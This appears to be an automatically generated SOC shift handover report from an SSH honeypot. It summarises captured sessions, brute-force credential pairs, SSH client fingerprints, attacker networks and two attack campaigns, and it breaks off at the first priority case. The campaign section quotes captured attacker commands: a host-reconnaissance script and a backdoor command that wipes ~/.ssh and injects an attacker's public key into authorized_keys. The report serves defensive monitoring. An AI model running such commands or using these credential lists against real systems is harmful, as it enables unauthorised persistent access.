# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-11 |
| **Generated At** | 2026-07-11T09:42:08Z |
| **Shift Time** | 09:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **752** |
| Confirmed Threats | **715** |
| False Positives Filtered | **37** (4.9%) |
| Unique Attacker IPs | **169** |
| Countries of Origin | **38** |
| High Severity Cases | **268** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **484** |
| Malware Samples Analyzed | **3** HIGH · **36** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **342** |
| Unique Credential Pairs | **196** |
| Unique Usernames | **36** |
| Unique Passwords | **137** |
| Successful Auth Pairs | **293** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 98 |
| `admin` | 30 |
| `user` | 20 |
| `guest` | 18 |
| `supervisor` | 17 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 16 |
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `123456` | 16 |
| `LeitboGi0ro` | 13 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `LeitboGi0ro` | 13 |
| `admin` | `admin` | 13 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `123@@@` | 7 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-11T04:57:12 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-11T04:57:12 |
| `supervisor` | `12345678` | `103.31.39.188` | 2026-07-11T04:57:52 |
| `supervisor` | `12345678` | `65.20.204.41` | 2026-07-11T04:58:00 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-11T04:58:11 |
| `support` | `passw0rd` | `177.135.206.10` | 2026-07-11T04:59:02 |
| `support` | `passw0rd` | `207.219.221.101` | 2026-07-11T04:59:14 |
| `user` | `user7` | `178.178.194.131` | 2026-07-11T04:59:38 |
| `user` | `user7` | `217.150.37.249` | 2026-07-11T04:59:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.239.71.239` | 2026-07-11T04:59:47 |
| `support` | `passw0rd` | `182.60.128.241` | 2026-07-11T05:02:30 |
| `support` | `passw0rd` | `179.185.18.67` | 2026-07-11T05:02:39 |
| `user` | `user7` | `210.177.143.61` | 2026-07-11T05:03:10 |
| `user` | `user7` | `49.124.147.105` | 2026-07-11T05:03:19 |
| `root` | `harley` | `10.0.0.73` | 2026-07-11T05:07:50 |
| `root` | `harley` | `185.242.3.195` | 2026-07-11T05:12:07 |
| `root` | `root666` | `181.233.140.250` | 2026-07-11T05:17:11 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-11T05:20:47 |
| `stackato` | `stackato` | `218.149.235.152` | 2026-07-11T05:22:32 |
| `stackato` | `stackato` | `62.182.132.94` | 2026-07-11T05:22:44 |
| `root` | `rootpass` | `103.159.54.61` | 2026-07-11T05:23:22 |
| `345gs5662d34` | `345gs5662d34` | `103.159.54.61` | 2026-07-11T05:23:26 |
| `root` | `3245gs5662d34` | `103.159.54.61` | 2026-07-11T05:23:28 |
| `debian` | `debian` | `203.198.173.137` | 2026-07-11T05:24:30 |
| `supervisor` | `password` | `83.239.84.130` | 2026-07-11T05:25:00 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-11T05:25:42 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-11T05:25:42 |
| `root` | `01234` | `185.242.3.195` | 2026-07-11T05:25:47 |
| `stackato` | `stackato` | `80.233.12.109` | 2026-07-11T05:25:48 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-11T05:25:50 |
| `stackato` | `stackato` | `10.0.0.73` | 2026-07-11T05:26:12 |
| `supervisor` | `password` | `10.0.0.73` | 2026-07-11T05:29:01 |
| `zhangsan` | `123456` | `165.154.241.28` | 2026-07-11T05:29:04 |
| `345gs5662d34` | `345gs5662d34` | `165.154.241.28` | 2026-07-11T05:29:07 |
| `zhangsan` | `3245gs5662d34` | `165.154.241.28` | 2026-07-11T05:29:09 |
| `root` | `banana123` | `10.0.0.73` | 2026-07-11T05:29:45 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-11T05:29:49 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T05:29:50 |
| `root` | `Qwertyu123` | `20.153.204.5` | 2026-07-11T05:35:34 |
| `345gs5662d34` | `345gs5662d34` | `20.153.204.5` | 2026-07-11T05:35:37 |
| `root` | `3245gs5662d34` | `20.153.204.5` | 2026-07-11T05:35:38 |
| `vm` | `vm123` | `10.0.0.73` | 2026-07-11T05:38:28 |
| `vm` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T05:38:32 |
| `centos` | `centos4` | `74.208.177.56` | 2026-07-11T05:38:55 |
| `maill` | `960..123` | `91.185.75.244` | 2026-07-11T05:39:01 |
| `345gs5662d34` | `345gs5662d34` | `91.185.75.244` | 2026-07-11T05:39:05 |
| `maill` | `3245gs5662d34` | `91.185.75.244` | 2026-07-11T05:39:06 |
| `root` | `01234` | `10.0.0.73` | 2026-07-11T05:40:11 |
| `centos` | `centos4` | `103.235.95.102` | 2026-07-11T05:42:32 |
| `root` | `admin` | `91.92.40.233` | 2026-07-11T05:45:04 |
| `root` | `password` | `91.92.40.233` | 2026-07-11T05:46:52 |
| `support` | `support0` | `121.128.84.224` | 2026-07-11T05:49:42 |
| `support` | `support0` | `80.65.90.155` | 2026-07-11T05:49:50 |
| `operator` | `123654` | `183.247.171.186` | 2026-07-11T05:50:41 |
| `root` | `toor` | `91.92.40.233` | 2026-07-11T05:50:41 |
| `support` | `support` | `176.53.159.196` | 2026-07-11T05:50:51 |
| `operator` | `123654` | `180.76.52.146` | 2026-07-11T05:50:52 |
| `Root` | `Root2003` | `10.0.0.73` | 2026-07-11T05:50:58 |
| `support` | `support` | `10.0.0.73` | 2026-07-11T05:52:11 |
| `root` | `qwerty` | `91.92.40.233` | 2026-07-11T05:52:35 |
| `support` | `support0` | `196.188.93.169` | 2026-07-11T05:53:19 |
| `support` | `support0` | `207.254.22.207` | 2026-07-11T05:53:25 |
| `support` | `support0` | `10.0.0.73` | 2026-07-11T05:53:40 |
| `root` | `12345` | `91.92.40.233` | 2026-07-11T05:54:30 |
| `operator` | `123654` | `10.0.0.73` | 2026-07-11T05:54:45 |
| `root` | `letmein` | `91.92.40.233` | 2026-07-11T05:56:22 |
| `ubuntu` | `qwert12345` | `185.242.3.195` | 2026-07-11T05:58:13 |
| `root` | `123456789` | `91.92.40.233` | 2026-07-11T05:58:15 |
| `root` | `admin123` | `91.92.40.233` | 2026-07-11T06:00:13 |
| `root` | `welcome` | `91.92.40.233` | 2026-07-11T06:02:11 |
| `root` | `P@ssw0rd` | `91.92.40.233` | 2026-07-11T06:04:13 |
| `blank` | `blank66` | `80.65.90.155` | 2026-07-11T06:04:27 |
| `root` | `passw0rd` | `91.92.40.233` | 2026-07-11T06:06:10 |
| `telecomadmin` | `admintelecom` | `45.156.87.178` | 2026-07-11T06:06:59 |
| `blank` | `blank66` | `111.70.23.238` | 2026-07-11T06:07:52 |
| `root` | `root123` | `91.92.40.233` | 2026-07-11T06:08:03 |
| `blank` | `blank66` | `10.0.0.73` | 2026-07-11T06:08:14 |
| `root` | `alpine` | `91.92.40.233` | 2026-07-11T06:09:56 |
| `root` | `changeme` | `91.92.40.233` | 2026-07-11T06:11:49 |
| `supervisor` | `0987654321` | `124.88.174.143` | 2026-07-11T06:11:54 |
| `ubuntu` | `qwert12345` | `10.0.0.73` | 2026-07-11T06:12:15 |
| `root` | `default` | `91.92.40.233` | 2026-07-11T06:13:40 |
| `supervisor` | `0987654321` | `111.70.23.251` | 2026-07-11T06:15:16 |
| `supervisor` | `qwerty12` | `92.62.74.41` | 2026-07-11T06:15:24 |
| `root` | `r00t` | `91.92.40.233` | 2026-07-11T06:15:28 |
| `supervisor` | `qwerty12` | `183.104.220.84` | 2026-07-11T06:15:33 |
| `supervisor` | `0987654321` | `10.0.0.73` | 2026-07-11T06:15:39 |
| `root` | `!@` | `187.8.3.230` | 2026-07-11T06:16:09 |
| `root` | `!@` | `117.71.53.210` | 2026-07-11T06:16:23 |
| `root` | `.Qq123456` | `216.155.93.75` | 2026-07-11T06:16:31 |
| `345gs5662d34` | `345gs5662d34` | `216.155.93.75` | 2026-07-11T06:16:34 |
| `root` | `3245gs5662d34` | `216.155.93.75` | 2026-07-11T06:16:35 |
| `root` | `root@123` | `91.92.40.233` | 2026-07-11T06:17:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.50.16` | 2026-07-11T06:18:58 |
| `root` | `Root123` | `91.92.40.233` | 2026-07-11T06:19:05 |
| `*1` | `$4` | `207.175.50.16` | 2026-07-11T06:19:08 |
| `supervisor` | `qwerty12` | `10.0.0.73` | 2026-07-11T06:19:08 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1188` | `207.175.50.16` | 2026-07-11T06:19:10 |
| `root` | `!@` | `125.72.150.250` | 2026-07-11T06:19:45 |
| `root` | `!@` | `103.230.176.152` | 2026-07-11T06:19:58 |
| `root` | `Kong@2023` | `166.148.146.247` | 2026-07-11T06:20:06 |
| `345gs5662d34` | `345gs5662d34` | `166.148.146.247` | 2026-07-11T06:20:08 |
| `root` | `3245gs5662d34` | `166.148.146.247` | 2026-07-11T06:20:09 |
| `root` | `!@` | `10.0.0.73` | 2026-07-11T06:20:19 |
| `root` | `!root` | `91.92.40.233` | 2026-07-11T06:21:12 |
| `root` | `rootme` | `91.92.40.233` | 2026-07-11T06:23:12 |
| `admin` | `admin` | `91.92.40.233` | 2026-07-11T06:25:03 |
| `user` | `qweqweqwe` | `10.0.0.73` | 2026-07-11T06:26:35 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T06:26:41 |
| `admin` | `password` | `91.92.40.233` | 2026-07-11T06:26:50 |
| `admin` | `123456` | `91.92.40.233` | 2026-07-11T06:28:40 |
| `demo` | `123456` | `185.242.3.195` | 2026-07-11T06:29:39 |
| `admin` | `admin123` | `91.92.40.233` | 2026-07-11T06:30:28 |
| `admin` | `letmein` | `91.92.40.233` | 2026-07-11T06:32:11 |
| `root` | `12qw12qw` | `10.0.0.73` | 2026-07-11T06:33:11 |
| `config` | `config12` | `185.2.228.48` | 2026-07-11T06:33:21 |
| `root` | `123@@@` | `168.110.102.254` | 2026-07-11T06:33:22 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-07-11T06:33:25 |
| `root` | `12345677` | `10.0.0.73` | 2026-07-11T06:33:28 |
| `config` | `config12` | `10.0.0.73` | 2026-07-11T06:33:47 |
| `admin` | `qwerty` | `91.92.40.233` | 2026-07-11T06:33:49 |
| `admin` | `12345` | `91.92.40.233` | 2026-07-11T06:35:31 |
| `default` | `123abc` | `31.28.253.144` | 2026-07-11T06:36:13 |
| `admin` | `admin@123` | `91.92.40.233` | 2026-07-11T06:37:11 |
| `ldap` | `P@ssw0rd` | `10.0.0.73` | 2026-07-11T06:37:45 |
| `ldap` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T06:37:51 |
| `admin` | `Admin123` | `91.92.40.233` | 2026-07-11T06:38:52 |
| `admin` | `admin` | `8.221.121.6` | 2026-07-11T06:38:55 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-11T06:38:56 |
| `default` | `123abc` | `183.99.228.131` | 2026-07-11T06:39:48 |
| `default` | `123abc` | `51.68.226.171` | 2026-07-11T06:40:00 |
| `admin` | `P@ssw0rd` | `91.92.40.233` | 2026-07-11T06:40:30 |
| `unknown` | `P@ssword` | `112.28.73.142` | 2026-07-11T06:41:50 |
| `unknown` | `P@ssword` | `200.106.49.149` | 2026-07-11T06:41:59 |
| `admin` | `welcome` | `91.92.40.233` | 2026-07-11T06:42:17 |
| `demo` | `123456` | `10.0.0.73` | 2026-07-11T06:43:19 |
| `admin` | `passw0rd` | `91.92.40.233` | 2026-07-11T06:44:03 |
| `root` | `Qw123456789` | `10.0.0.73` | 2026-07-11T06:44:08 |
| `test` | `raspberry` | `185.65.238.250` | 2026-07-11T06:44:18 |
| `test` | `raspberry` | `112.194.142.167` | 2026-07-11T06:44:31 |
| `test` | `raspberry` | `10.0.0.73` | 2026-07-11T06:44:43 |
| `unknown` | `P@ssword` | `177.135.206.10` | 2026-07-11T06:45:05 |
| `unknown` | `P@ssword` | `92.62.74.41` | 2026-07-11T06:45:13 |
| `admin` | `administrator` | `91.92.40.233` | 2026-07-11T06:45:50 |
| `admin` | `adminroot` | `91.92.40.233` | 2026-07-11T06:47:45 |
| `admin` | `adminadmin` | `91.92.40.233` | 2026-07-11T06:49:42 |
| `user` | `user` | `91.92.40.233` | 2026-07-11T06:51:52 |
| `user` | `password` | `91.92.40.233` | 2026-07-11T06:54:06 |
| `user` | `123456` | `91.92.40.233` | 2026-07-11T06:55:48 |
| `admin` | `admin` | `35.241.208.90` | 2026-07-11T06:55:56 |
| `user` | `qwerty` | `91.92.40.233` | 2026-07-11T06:57:30 |
| `user` | `12345` | `91.92.40.233` | 2026-07-11T06:59:07 |
| `operator` | `uploader` | `10.0.0.73` | 2026-07-11T06:59:18 |
| `ubuntu` | `q1w2e` | `185.242.3.195` | 2026-07-11T07:00:27 |
| `user` | `letmein` | `91.92.40.233` | 2026-07-11T07:00:45 |
| `user` | `welcome` | `91.92.40.233` | 2026-07-11T07:02:26 |
| `user` | `passw0rd` | `91.92.40.233` | 2026-07-11T07:04:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.62.182` | 2026-07-11T07:05:29 |
| `*1` | `$4` | `34.77.62.182` | 2026-07-11T07:05:43 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7780` | `34.77.62.182` | 2026-07-11T07:05:45 |
| `user` | `user123` | `91.92.40.233` | 2026-07-11T07:05:48 |
| `guest` | `guest88` | `195.222.57.190` | 2026-07-11T07:06:39 |
| `guest` | `guest88` | `196.188.93.169` | 2026-07-11T07:06:47 |
| `guest` | `guest44` | `121.189.198.60` | 2026-07-11T07:07:25 |
| `user` | `user1` | `91.92.40.233` | 2026-07-11T07:07:34 |
| `user` | `userpass` | `91.92.40.233` | 2026-07-11T07:09:19 |
| `guest` | `guest88` | `103.250.160.76` | 2026-07-11T07:10:18 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-11T07:10:19 |
| `guest` | `guest44` | `211.223.41.90` | 2026-07-11T07:11:01 |
| `user` | `user@123` | `91.92.40.233` | 2026-07-11T07:11:09 |
| `guest` | `guest44` | `128.185.12.179` | 2026-07-11T07:11:14 |
| `guest` | `guest44` | `10.0.0.73` | 2026-07-11T07:11:29 |
| `user` | `User123` | `91.92.40.233` | 2026-07-11T07:12:57 |
| `ubuntu` | `q1w2e` | `10.0.0.73` | 2026-07-11T07:14:06 |
| `user` | `guest` | `91.92.40.233` | 2026-07-11T07:14:41 |
| `test` | `test` | `91.92.40.233` | 2026-07-11T07:16:26 |
| `test` | `password` | `91.92.40.233` | 2026-07-11T07:18:12 |
| `test` | `123456` | `91.92.40.233` | 2026-07-11T07:19:54 |
| `supervisor` | `toor` | `121.159.71.249` | 2026-07-11T07:21:14 |
| `test` | `test123` | `91.92.40.233` | 2026-07-11T07:21:39 |
| `test` | `qwerty` | `91.92.40.233` | 2026-07-11T07:23:25 |
| `supervisor` | `toor` | `65.20.233.110` | 2026-07-11T07:24:55 |
| `supervisor` | `toor` | `61.37.150.6` | 2026-07-11T07:25:03 |
| `supervisor` | `toor` | `10.0.0.73` | 2026-07-11T07:25:15 |
| `test` | `12345` | `91.92.40.233` | 2026-07-11T07:25:18 |
| `test` | `test@123` | `91.92.40.233` | 2026-07-11T07:27:09 |
| `test` | `Test123` | `91.92.40.233` | 2026-07-11T07:28:53 |
| `test` | `testing` | `91.92.40.233` | 2026-07-11T07:30:38 |
| `jack` | `jack` | `185.242.3.195` | 2026-07-11T07:31:29 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-11T07:32:17 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-11T07:32:17 |
| `test` | `tester` | `91.92.40.233` | 2026-07-11T07:32:22 |
| `security` | `security` | `223.82.97.51` | 2026-07-11T07:32:28 |
| `root` | `4444444` | `182.156.80.11` | 2026-07-11T07:33:34 |
| `test` | `testpass` | `91.92.40.233` | 2026-07-11T07:34:06 |
| `guest` | `guest` | `91.92.40.233` | 2026-07-11T07:35:48 |
| `security` | `security` | `182.75.197.174` | 2026-07-11T07:35:58 |
| `guest` | `password` | `91.92.40.233` | 2026-07-11T07:37:32 |
| `guest` | `123456` | `91.92.40.233` | 2026-07-11T07:39:16 |
| `guest` | `qwerty` | `91.92.40.233` | 2026-07-11T07:40:57 |
| `guest` | `welcome` | `91.92.40.233` | 2026-07-11T07:42:36 |
| `guest` | `guest123` | `91.92.40.233` | 2026-07-11T07:44:14 |
| `jack` | `jack` | `10.0.0.73` | 2026-07-11T07:45:23 |
| `guest` | `guestpass` | `91.92.40.233` | 2026-07-11T07:45:51 |
| `guest` | `guest@123` | `91.92.40.233` | 2026-07-11T07:47:28 |
| `nishant` | `nishant` | `10.0.0.73` | 2026-07-11T07:48:53 |
| `nishant` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T07:48:59 |
| `guest` | `Guest123` | `91.92.40.233` | 2026-07-11T07:49:00 |
| `root` | `Vv123456` | `34.14.122.221` | 2026-07-11T07:49:16 |
| `345gs5662d34` | `345gs5662d34` | `34.14.122.221` | 2026-07-11T07:49:18 |
| `root` | `3245gs5662d34` | `34.14.122.221` | 2026-07-11T07:49:19 |
| `root` | `admin` | `64.89.161.91` | 2026-07-11T07:50:03 |
| `root` | `asd12345` | `64.89.161.91` | 2026-07-11T07:50:14 |
| `root` | `2wsx#EDC` | `64.89.161.91` | 2026-07-11T07:50:24 |
| `support` | `support` | `64.89.161.91` | 2026-07-11T07:50:31 |
| `guest` | `anonymous` | `91.92.40.233` | 2026-07-11T07:50:35 |
| `ubuntu` | `ubuntu` | `91.92.40.233` | 2026-07-11T07:52:11 |
| `root` | `1234!@#$qwer` | `95.90.13.168` | 2026-07-11T07:52:20 |
| `345gs5662d34` | `345gs5662d34` | `95.90.13.168` | 2026-07-11T07:52:23 |
| `root` | `3245gs5662d34` | `95.90.13.168` | 2026-07-11T07:52:23 |
| `ubuntu` | `password` | `91.92.40.233` | 2026-07-11T07:53:46 |
| `ubuntu` | `ubuntu123` | `91.92.40.233` | 2026-07-11T07:55:23 |
| `ubuntu` | `ubuntu1` | `91.92.40.233` | 2026-07-11T07:56:58 |
| `ubuntu` | `ubuntu@123` | `91.92.40.233` | 2026-07-11T07:58:34 |
| `root` | `freenas` | `153.37.177.219` | 2026-07-11T07:59:40 |
| `ubuntu` | `Ubuntu123` | `91.92.40.233` | 2026-07-11T08:00:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.204.234` | 2026-07-11T08:00:42 |
| `*1` | `$4` | `35.195.204.234` | 2026-07-11T08:00:55 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1314` | `35.195.204.234` | 2026-07-11T08:00:57 |
| `ubuntu` | `changeme` | `91.92.40.233` | 2026-07-11T08:01:35 |
| `admin` | `Abcd1234` | `78.25.127.202` | 2026-07-11T08:02:19 |
| `root` | `Root@123456` | `185.242.3.195` | 2026-07-11T08:02:52 |
| `admin` | `Abcd1234` | `10.0.0.73` | 2026-07-11T08:02:53 |
| `ubuntu` | `123456` | `91.92.40.233` | 2026-07-11T08:03:04 |
| `root` | `freenas` | `113.11.34.221` | 2026-07-11T08:03:46 |
| `root` | `freenas` | `218.103.120.150` | 2026-07-11T08:03:58 |
| `ubuntu` | `qwerty` | `91.92.40.233` | 2026-07-11T08:04:32 |
| `pi` | `raspberry` | `91.92.40.233` | 2026-07-11T08:06:01 |
| `pi` | `password` | `91.92.40.233` | 2026-07-11T08:07:29 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-11T08:07:36 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-11T08:07:36 |
| `pi` | `raspberrypi` | `91.92.40.233` | 2026-07-11T08:08:59 |
| `pi` | `123456` | `91.92.40.233` | 2026-07-11T08:10:30 |
| `pi` | `qwerty` | `91.92.40.233` | 2026-07-11T08:12:04 |
| `pi` | `pi123` | `91.92.40.233` | 2026-07-11T08:13:48 |
| `pi` | `rasp` | `91.92.40.233` | 2026-07-11T08:15:29 |
| `root` | `Root@123456` | `10.0.0.73` | 2026-07-11T08:16:50 |
| `pi` | `pihole` | `91.92.40.233` | 2026-07-11T08:17:10 |
| `default` | `default77` | `10.0.0.73` | 2026-07-11T08:18:01 |
| `pi` | `p@ssw0rd` | `91.92.40.233` | 2026-07-11T08:18:54 |
| `oracle` | `oracle` | `91.92.40.233` | 2026-07-11T08:20:37 |
| `oracle` | `password` | `91.92.40.233` | 2026-07-11T08:22:16 |
| `oracle` | `123456` | `91.92.40.233` | 2026-07-11T08:23:59 |
| `oracle` | `oracle123` | `91.92.40.233` | 2026-07-11T08:25:36 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-11T08:25:42 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-11T08:25:42 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-11T08:25:52 |
| `oracle` | `oracle1` | `91.92.40.233` | 2026-07-11T08:27:12 |
| `oracle` | `oracle@123` | `91.92.40.233` | 2026-07-11T08:28:41 |
| `unknown` | `unknown123456` | `196.189.126.10` | 2026-07-11T08:29:22 |
| `unknown` | `unknown123456` | `222.236.155.146` | 2026-07-11T08:29:32 |
| `oracle` | `Oracle123` | `91.92.40.233` | 2026-07-11T08:30:01 |
| `Root` | `444444444` | `10.0.0.73` | 2026-07-11T08:31:20 |
| `oracle` | `welcome` | `91.92.40.233` | 2026-07-11T08:31:24 |
| `oracle` | `qwerty` | `91.92.40.233` | 2026-07-11T08:32:49 |
| `postgres` | `postgres` | `91.92.40.233` | 2026-07-11T08:34:19 |
| `root` | `qwerty0123` | `185.242.3.195` | 2026-07-11T08:34:19 |
| `postgres` | `password` | `91.92.40.233` | 2026-07-11T08:35:52 |
| `debian` | `temppwd` | `10.0.0.73` | 2026-07-11T08:37:23 |
| `root` | `p@ssword12345!` | `10.0.0.73` | 2026-07-11T08:37:24 |
| `postgres` | `123456` | `91.92.40.233` | 2026-07-11T08:37:24 |
| `root` | `123456Aa12` | `10.0.0.73` | 2026-07-11T08:37:58 |
| `123456` | `123456` | `10.0.0.73` | 2026-07-11T08:38:07 |
| `adm` | `123456` | `10.0.0.73` | 2026-07-11T08:38:21 |
| `root` | `a123123456` | `10.0.0.73` | 2026-07-11T08:38:24 |
| `postgres` | `postgres123` | `91.92.40.233` | 2026-07-11T08:39:00 |
| `default` | `default8` | `112.26.99.93` | 2026-07-11T08:40:10 |
| `default` | `default8` | `112.26.101.76` | 2026-07-11T08:40:25 |
| `postgres` | `postgres1` | `91.92.40.233` | 2026-07-11T08:40:35 |
| `postgres` | `postgres@123` | `91.92.40.233` | 2026-07-11T08:42:11 |
| `postgres` | `Postgres123` | `91.92.40.233` | 2026-07-11T08:43:46 |
| `default` | `default8` | `218.202.143.68` | 2026-07-11T08:43:52 |
| `postgres` | `qwerty` | `91.92.40.233` | 2026-07-11T08:45:26 |
| `postgres` | `admin` | `91.92.40.233` | 2026-07-11T08:47:11 |
| `root` | `qwerty0123` | `10.0.0.73` | 2026-07-11T08:48:18 |
| `ftp` | `ftp` | `91.92.40.233` | 2026-07-11T08:48:53 |
| `ftp` | `password` | `91.92.40.233` | 2026-07-11T08:50:34 |
| `admin` | `admin` | `47.77.216.159` | 2026-07-11T08:51:04 |
| `guest` | `121212` | `70.89.116.5` | 2026-07-11T08:51:53 |
| `ftp` | `123456` | `91.92.40.233` | 2026-07-11T08:52:15 |
| `operator` | `raspberry` | `187.8.120.90` | 2026-07-11T08:53:38 |
| `operator` | `raspberry` | `178.178.222.59` | 2026-07-11T08:53:46 |
| `ftp` | `ftp123` | `91.92.40.233` | 2026-07-11T08:53:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **752** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 138 |
| OpenSSH | 69 |
| libssh | 53 |
| Paramiko (Python) | 26 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 112 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 69 | 65 |
| `f555226df196...` | Mirai/variant | 26 | 10 |
| `a2de0f306611...` | Mirai/variant | 18 | 4 |
| `16443846184e...` | Generic scanner | 15 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 112 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 69 | 65 | Mirai/variant |
| `f555226df196...` | libssh | 26 | 10 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 18 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 5 | — |
| `16443846184e...` | Go SSH scanner | 15 | 1 | Generic scanner |
| `6372ee695756...` | Paramiko (Python) | 8 | 2 | Modern SSH client |
| `4ed0d5b0dc3b...` | libssh | 5 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 110 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.233`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.14.122.221`, `91.185.75.244`, `165.154.241.28`, `95.90.13.168`, `103.159.54.61`, `216.155.93.75`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **169** |
| Unique ASNs | **90** |
| High-Risk ASNs | **81** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 14 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 11 | MEDIUM |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS4766` | Korea Telecom | 8 | HIGH |
| `AS31898` | Oracle Corporation | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (268)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f81b09f144ce

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 04:57 |
| **Last Seen** | 2026-07-11 04:57 |
